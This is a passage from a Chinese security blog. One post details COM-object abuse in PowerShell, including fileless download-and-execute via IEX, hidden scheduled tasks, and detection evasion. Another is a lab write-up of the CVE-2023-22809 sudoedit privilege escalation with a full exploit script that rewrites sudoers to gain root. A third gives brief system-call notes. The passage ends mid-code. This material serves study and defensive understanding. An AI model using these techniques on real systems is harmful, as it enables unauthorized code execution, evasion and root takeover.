-<h2 id="COM-（Component-Object-Model）"><a href="#COM-（Component-Object-Model）" class="headerlink" title="COM  （Component Object Model）"></a>COM  （Component Object Model）</h2><p>面向对象的编程模型，定义组件及其接口，让接口和实现分离， 组件信息通常存储在Windows注册表中 。</p>
-<p>COM是在1990年代创建的，作为独立于语言的二进制互相操作性标准，COM使得单独的代码模块能够相互交互。这样一来，就可以在单个进程或跨进程中实现，为分布式COM（DCOM）添加序列化，允许通过网络进行远程过程调用（Remote Procedure Call）。</p>
-<p>1.CLSID 类标识符</p>
-<p>2.IID 接口标识符</p>
-<p>3.组件的文件路径</p>
-<p>可以使用oleview.exe查看。</p>
-<h2 id="几个有趣的COM对象"><a href="#几个有趣的COM对象" class="headerlink" title="几个有趣的COM对象"></a>几个有趣的COM对象</h2><p>可以允许任务调度、无文件下载并执行、命令执行。尽管这些对象本身不是安全漏洞，但可以使用这些对象基于进程行为和启发式特征来对抗检测。</p>
-<p>注册表项<code>HKEY_CLASSES_ROOT\CLSID</code>将公开枚举COM对象所需的所有信息，包括CLSID和ProgID。CLSID是与COM类对象关联的全局唯一标识符。ProgID是一个对开发者非常友好的字符串，表示底层的CLSID。</p>
-<p>使用下面的PowerShell命令来获取CLSID列表。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">列举HKCR下的CLSID：</span><br><span class="line"></span><br><span class="line">New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR</span><br><span class="line">Get-ChildItem -Path HKCR:\CLSID -Name  | Select -Skip 1 &gt; clsids.txt</span><br></pre></td></tr></table></figure>
-<h3 id="获取所有CLSID公开的方法和属性"><a href="#获取所有CLSID公开的方法和属性" class="headerlink" title="获取所有CLSID公开的方法和属性"></a>获取所有CLSID公开的方法和属性</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">用于枚举可用方法和属性的PowerShell Scriptlet：</span><br><span class="line">得等待一会，因为有7356个条目要被执行</span><br><span class="line"></span><br><span class="line">$Position = 1  </span><br><span class="line">$Filename = &quot;win10-clsid-members.txt&quot;  </span><br><span class="line">$inputFilename = &quot;clsids.txt&quot;  </span><br><span class="line">ForEach($CLSID in Get-Content $inputFilename) &#123;</span><br><span class="line">	Write-Output &quot;$($Position) - $($CLSID)&quot;</span><br><span class="line">	Write-Output &quot;------------------------&quot; | Out-File $Filename -Append</span><br><span class="line">	Write-Output $($CLSID) | Out-File $Filename -Append </span><br><span class="line">	$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))</span><br><span class="line">	$handle | Get-Member | Out-File $Filename -Append</span><br><span class="line">	$Position += 1  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>非Microsoft的COM对象通常会被省略，因为它们不能可靠地存在于目标及其上，这限制了这些对象在红蓝对抗实际蓝军<em>*</em>中的可用性。为了定位开发人员的计算机，我们在此项研究中涵盖了Windows SDK中的特定Microsoft COM对象。</p>
-<p>在获得成员后，使用基于关键字的搜索方法快速得到结果。在我们的研究中，使用了以下关键字：execute（执行）、exec（执行）、spawn（派生）、launch（执行）和run（运行）。</p>
-<h2 id="启动进程"><a href="#启动进程" class="headerlink" title="启动进程"></a>启动进程</h2><p>可以启动命令，如下所示。</p>
-<p>使用ProcessChainLib COM服务器启动进程：</p>
-<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$handle</span> = [<span class="type">activator</span>]::CreateInstance([<span class="type">type</span>]::GetTypeFromCLSID(<span class="string">&quot;E430E93D-09A9-4DC5-80E3-CBB2FB9AF28E&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="variable">$handle</span>.CommandLine = <span class="string">&quot;cmd /c whoami&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$handle</span>.Start([<span class="type">ref</span>]<span class="variable">$True</span>)</span><br></pre></td></tr></table></figure>
-<h2 id="无文件下载和执行"><a href="#无文件下载和执行" class="headerlink" title="无文件下载和执行"></a>无文件下载和执行</h2><p>COM对象{F5078F35-C551-11D3-89B9-0000F81FE221}（Msxml2.XMLHTTP.3.0）公开了一个XML HTTP 3.0功能，该功能可用于下载任意代码并执行，无需将Payload写入磁盘，并且不会触发寻找常用System.Net.WebClient的规则。XML HTTP 3.0对象通常用于执行AJAX请求。在这种情况下，可以使用Invoke-Expression Cmdlet（IEX）直接执行获取的数据。</p>
-<p>下面的示例展示了本地执行代码的过程。</p>
-<p>不包含System.Net.WebClient的无文件下载：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$o = [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;));</span><br><span class="line">$o.Open(&quot;GET&quot;, &quot;http://127.0.0.1/payload&quot;, $False);</span><br><span class="line">$o.Send(); IEX $o.responseText;</span><br></pre></td></tr></table></figure>
-<h3 id="任务调度"><a href="#任务调度" class="headerlink" title="任务调度"></a>任务调度</h3><p>另一个例子是{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}，它实现了用于操作Windows任务调度程序服务的Schedule.Service类。该COM对象允许特权用户在不使用schtasks.exe二进制文件或at命令的情况下，在主机（包括远程主机）上执行计划任务。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">$TaskName = [Guid]::NewGuid().ToString()</span><br><span class="line"></span><br><span class="line">$Instance = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))</span><br><span class="line"></span><br><span class="line">$Instance.Connect()</span><br><span class="line"></span><br><span class="line">$Folder = $Instance.GetFolder(&quot;\&quot;)</span><br><span class="line"></span><br><span class="line">$Task = $Instance.NewTask(0)</span><br><span class="line"></span><br><span class="line">$Trigger = $Task.triggers.Create(0)</span><br><span class="line"></span><br><span class="line">$Trigger.StartBoundary = Convert-Date -Date ((Get-Date).addSeconds($Delay))</span><br><span class="line"></span><br><span class="line">$Trigger.EndBoundary = Convert-Date -Date ((Get-Date).addSeconds($Delay   120))</span><br><span class="line"></span><br><span class="line">$Trigger.ExecutionTimelimit = &quot;PT5M&quot;</span><br><span class="line"></span><br><span class="line">$Trigger.Enabled = $True</span><br><span class="line"></span><br><span class="line">$Trigger.Id = $Taskname</span><br><span class="line"></span><br><span class="line">$Action = $Task.Actions.Create(0)</span><br><span class="line"></span><br><span class="line">$Action.Path = “cmd.exe”</span><br><span class="line"></span><br><span class="line">$Action.Arguments = “/c whoami”</span><br><span class="line"></span><br><span class="line">$Action.HideAppWindow = $True</span><br><span class="line"></span><br><span class="line">$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">function Convert-Date &#123;      </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        param(</span><br><span class="line"></span><br><span class="line">             [datetime]$Date</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        )      </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        PROCESS &#123;</span><br><span class="line"></span><br><span class="line">               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="COM对象枚举：递归COM对象"><a href="#COM对象枚举：递归COM对象" class="headerlink" title="COM对象枚举：递归COM对象"></a>COM对象枚举：递归COM对象</h2><p>每个对象都可能会返回无法直接创建的其他对象。在这里，引入的更改以递归方式搜索COM对象，这些对象仅通过每个枚举OCM对象的成员方法和属性公开。在原始方法中，查看了每个对象直接公开的方法，并没有递归到任何属性，这些属性也可能是自身具有值得关注的方法的COM对象，可以找到调用公开代码执行COM对象方法的新方法。</p>
-<h3 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h3><p>目前公开的所有使用COM对象执行代码的技术，发现它们之间具有一个共同点，就是都利用了在COM对象的子属性中公开的方法。一个例子是“MMC20.Application”COM对象。要利用此COM对象实现代码执行，我们需要在“Document.ActiveView”属性返回的View对象上使用“ExecuteShellCommand”方法，正如Matt Nelson在博客文章上所写的那样。在下图中，我们可以看到该方法只能在“Document.ActiveView”返回的对象中被发现，并且不会被MMC20.Application COM对象直接暴露。</p>
-<p>列出MMC20.Application COM对象中的ExecuteShellCommand方法：</p>
-<p><img src="/categories/CTF/Shellcode01/1693235040046.png" alt="1693235040046"></p>
-<h3 id="例子2"><a href="#例子2" class="headerlink" title="例子2"></a>例子2</h3><p>另一个例子是“ShellBrowserWindow”COM对象，这也是由Matt Nelson在博客文章中首次撰写的。如下图所示，“ShellExecute”方法没有直接暴露在COM对象中。但是，“Document.Application”属性返回Shell对象的实例，该实例公开ShellExecute方法。</p>
-<p>在ShellBrowserWindow COM对象中列出ExecuteShellCommand方法：</p>
-<p><img src="/categories/CTF/Shellcode01/1693235288620.png" alt="1693235288620"></p>
-<p>作为前两个示例的证据，重要的是不仅要查看COM对象直接公开的方法，还要递归查找具有作为COM对象属性公开的可用方法的对象。这个示例说明了为什么仅仅静态探索COM对象的类型库可能是不够的，只有在动态枚举泛型类型IDispatch的对象后才能访问相关函数。这种递归的方法可以实现查找用于代码执行的新COM对象，以及使用可用于代码执行的公开COM对象的不同方法。</p>
-<p>使用这种递归方法，如何找到一种调用公开COM对象方法的新途径呢？我们可以参考“ShellBrowserWindow”COM对象中的“ShellExecute”方法。该方法在本文前面已经详细说明过。以前，众所周知，在“ShellBrowserWindow”COM对象中调用此方法的方式是使用“Document.Application”属性。通过递归COM对象方法，我们发现，还可以对“Document.Application.Parent”属性返回的对象调用“ShellExecute”方法，如下图所示。可以逃避检测。</p>
-<h3 id="例子3"><a href="#例子3" class="headerlink" title="例子3"></a>例子3</h3><p>使用ShellBrowserWindow COM对象调用ShellExecute的替代方法：</p>
-<p><img src="/categories/CTF/Shellcode01/1693235404222.png" alt="1693235404222"></p>
-<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>使用这种递归COM对象方法进行探索后，我们能够找到一个ProgID为“Excel.ChartApplication”的COM对象，该对象可用于使用DDEInitiate方法执行代码。这种启动可执行文件的DDEInitiate方法首先在“Excel.Application”COM对象中被滥用，如Cybereason所写的文章所示。“Excel.ChartApplication”COM对象中有多个属性，它们返回可用于执行DDEInitiate方法的对象，如下图所示。尽管这个DDEInitiate方法也是由COM对象直接公开的，但它是在最初的探索过程中被发现的，是在可以从此对象访问的其他对象中公开的方法。</p>
-<p>使用Excel.ChartApplication COM对象调用DDEInitiate的3种方法：</p>
-<p><img src="/categories/CTF/Shellcode01/1693235499814.png" alt="1693235499814"></p>
-<p>该COM对象也可以实例化，并远程用于Office 2013，如下图所示。COM对象只能在Office 2016中本地实例化。当尝试远程实例化Office 2016时，将会返回错误代码，表示COM对象类未注册远程实例化。</p>
-<p>使用Excel.ChartApplication远程<em>*</em>Office 2013：</p>
-<p><img src="/categories/CTF/Shellcode01/1693235560701.png" alt="1693235560701"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>COM对象非常强大，功能多样，并且与Windows集成，这也就意味着COM对象几乎总是可用的。COM对象可以用于打破不同的检测模式，包括命令行参数、PowerShell日志记录和启发式检测。COM对象方法的递归搜索，可以帮助我们发现可用于代码执行的新COM对象，以及调用众所周知COM对象方法的新思路。这些COM对象方法可用于打破不同的检测模式，也可以用于横向移动。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/Untitled/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/CTF/Untitled/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-08-27 18:50:44" itemprop="dateCreated datePublished" datetime="2023-08-27T18:50:44+08:00">2023-08-27</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Notes/Linkers&Loaders04/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/Notes/Linkers&Loaders04/" class="post-title-link" itemprop="url">Chap12-系统调用</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-08-27 14:58:58 / Modified: 16:41:48" itemprop="dateCreated datePublished" datetime="2023-08-27T14:58:58+08:00">2023-08-27</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <blockquote>
-<p>/usr/include/unistd.h  一些系统调用的C语言形式定义</p>
-<p>/usr/include/asm-<em>/unistd</em>.h 存放系统调用号</p>
-<p>linux-5.6.18\arch\x86\kernel\traps.c x86的部分中断向量表</p>
-</blockquote>
-<p>绕过glibc获得更高的文件读写性能。</p>
-<p>为了兼容不同系统的系统调用（定义、实现会各不相同），增加一个抽象层——运行库（标准库），保证了源码级别的可移植性  。</p>
-<p>CRT只能取各个平台功能的交集。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov 2,eax ;把fork的系统调用号传到寄存器</span><br><span class="line">int 0x80 ;调用中断</span><br><span class="line">;中断服务程序从eax里取得系统调用号，</span><br><span class="line">;查表，eax=2</span><br><span class="line">;调用sys_fork函数</span><br></pre></td></tr></table></figure>
-<h3 id="1-触发中断"><a href="#1-触发中断" class="headerlink" title="1.触发中断"></a>1.触发中断</h3><p>x86下Linux支持的系统调用参数最多可以达到6个，分别用EBX、ECX、EDX、ESI、EDI、EBP存储。</p>
-<h3 id="2-堆栈切换"><a href="#2-堆栈切换" class="headerlink" title="2.堆栈切换"></a>2.堆栈切换</h3><p>用户态的ESP和SS的值保存在内核栈里。</p>
-<p>当0x80号中断nt 发生时，</p>
-<p>1.CPU切入内核态</p>
-<p>2.CPU找到当前进程的内核栈</p>
-<p>3.在内核栈中依次压入用户态的SS、ESP、EFLAGS、CS（环境）、EIP（返回地址）。</p>
-<blockquote>
-<p>当iret时，再依次弹出这些值到对应的寄存器里。</p>
-</blockquote>
-<h3 id="3-中断处理程序"><a href="#3-中断处理程序" class="headerlink" title="3.中断处理程序"></a>3.中断处理程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">INT x:</span><br><span class="line"></span><br><span class="line">根据x的值</span><br><span class="line"></span><br><span class="line">if x=00:  除0</span><br><span class="line"></span><br><span class="line">if x=0x14: 缺页</span><br><span class="line"></span><br><span class="line">if x=0x02 :硬件驱动</span><br><span class="line"></span><br><span class="line">if x=0x80: system_call</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">​	eax=1 =&gt;sys_exit</span><br><span class="line"></span><br><span class="line">​	eax=2 =&gt;sys_fork</span><br><span class="line"></span><br><span class="line">​	eax=3 =&gt;sys_read</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/CVE-2023-22809/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/CTF/CVE-2023-22809/" class="post-title-link" itemprop="url">CVE-2023-22809 sudo提权漏洞</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-08-27 14:19:49 / Modified: 22:45:25" itemprop="dateCreated datePublished" datetime="2023-08-27T14:19:49+08:00">2023-08-27</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.shellcodes.org/Hacking/CVE-2023-22809%EF%BC%88sudoedit%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%89%E5%88%86%E6%9E%90.html">CVE-2023-22809（sudoedit权限提升漏洞）分析</a></p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/uiAEnK5tqkKh0bqWPoTIKg">https://mp.weixin.qq.com/s/uiAEnK5tqkKh0bqWPoTIKg</a></p>
-</blockquote>
-<p>漏洞简介：Sudo中的sudoedit对处理用户提供的环境变量（如SUDO_EDITOR、VISUAL和EDITOR）中传递的额外参数存在缺陷。当用户指定的编辑器包含绕过sudoers策略的“–”参数时，拥有sudoedit访问权限的本地攻击者可以实现任意文件编辑 ，最终实现权限提升 。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">◆漏洞评分：7.8分</span><br><span class="line">◆影响版本：sudo 1.8.0-sudo 1.9.12p1(sudo&gt;=1.8.0 or sudo &lt;=1.9.12p1)</span><br></pre></td></tr></table></figure>
-<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>VMware Ubuntu22 </p>
-<p>sudo-1.9.12p1</p>
-<p>test用户拥有执行sudoedit的能力，但不能执行sudo。</p>
-<h3 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h3><p>1.安装sudo-1.9.12p1/</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.sudo.ws/dist/sudo-1.9.12p1.tar.gz</span><br><span class="line">tar -zxvf ./sudo-1.9.12p1.tar.gz</span><br><span class="line">cd sudo-1.9.12p1/</span><br><span class="line">./configure &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
-<p> 2.设置test用户权限</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">useradd -m test #添加攻击用低权限用户</span><br><span class="line">passwd test -d  #设置为空密码</span><br><span class="line">vim /etc/sudoers  #给test sudoedit权限</span><br><span class="line">添加下面两行</span><br><span class="line">Cmnd_Alias SUDOEDIT = sudoedit /etc/custom_test.txt</span><br><span class="line">test ALL=(ALL:ALL) SUDOEDIT</span><br></pre></td></tr></table></figure>
-<p>此时sudoedit只能编辑/etc/custom_test.txt。</p>
-<p><img src="/categories/CTF/CVE-2023-22809/1693146377666.png" alt="1693146377666"></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="1-EXP-记得行尾保存为Unix格式"><a href="#1-EXP-记得行尾保存为Unix格式" class="headerlink" title="1.EXP  记得行尾保存为Unix格式"></a>1.EXP  记得行尾保存为Unix格式</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ! sudo --version | <span class="built_in">head</span> -1 | grep -qE <span class="string">&#x27;(1\.8.*|1\.9\.[0-9]1?(p[1-3])?|1\.9\.12p1)$&#x27;</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&gt; Currently installed sudo version is not vulnerable&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#判断sudoers里有无test ALL=(ALL:ALL) sudoedit</span></span><br><span class="line">EXPLOITABLE=$(sudo -l | grep -E <span class="string">&quot;sudoedit|sudo -e&quot;</span> | grep -E <span class="string">&#x27;\(root\)|\(ALL\)|\(ALL : ALL\)&#x27;</span> | <span class="built_in">cut</span> -d <span class="string">&#x27;)&#x27;</span> -f 2-)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$EXPLOITABLE</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&gt; It doesn&#x27;t seem that this user can run sudoedit as root&quot;</span></span><br><span class="line">    <span class="built_in">read</span> -p <span class="string">&quot;Do you want to proceed anyway? (y/N): &quot;</span> confirm &amp;&amp; [[ <span class="variable">$confirm</span> == [yY] ]] || <span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&gt; BINGO! User exploitable&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&gt; Opening sudoers file, please add the following line to the file in order to do the privesc:&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$USER</span> ALL=(ALL:ALL) ALL&quot;</span></span><br><span class="line"><span class="built_in">read</span> -n 1 -s -r -p <span class="string">&quot;Press any key to continue...&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$EXPLOITABLE</span>&quot;</span></span><br><span class="line"><span class="comment">#下面的payload实际上是EDITOR=&quot;vim -- /etc/sudoers&quot; sudoedit</span></span><br><span class="line">EDITOR=<span class="string">&quot;vim -- /etc/sudoers&quot;</span> <span class="variable">$EXPLOITABLE</span></span><br><span class="line">sudo su root</span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>
-<p>2.在上面的exp运行时，按两下回车，会自动打开sudoers的编辑界面。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">将之前的</span><br><span class="line">test ALL=(ALL:ALL) sudoedit</span><br><span class="line">改为--&gt;</span><br><span class="line">test ALL=(ALL:ALL) ALL</span><br><span class="line">保存退出</span><br></pre></td></tr></table></figure>
-<p>此时，如果不对sudoers进行编辑，退出时会发现，此时执行了三次sudoedit。</p>
-<p><img src="/categories/CTF/CVE-2023-22809/1693146781832.png" alt="1693146781832"></p>
-<p>3.返回运行exp的界面，回车继续运行。</p>
-<p><img src="/categories/CTF/CVE-2023-22809/1693142053286.png" alt="1693142053286"></p>
-<p>成功提权。</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p> sudoedit —&gt; plugins/sudoers/editor.c的 find_editor函数—-&gt;resolve_editor</p>
-<p>执行 sudoedit 时，会调用 plugins/sudoers/editor.c 中的 find_editor 函数，find_editor 会根据 SUDO_EDITOR、VISUAL、EDITOR 三个环境变量设置的编辑器来指定编辑器：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *</span><br><span class="line"><span class="title function_">find_editor</span><span class="params">(<span class="type">int</span> nfiles, <span class="type">char</span> **files, 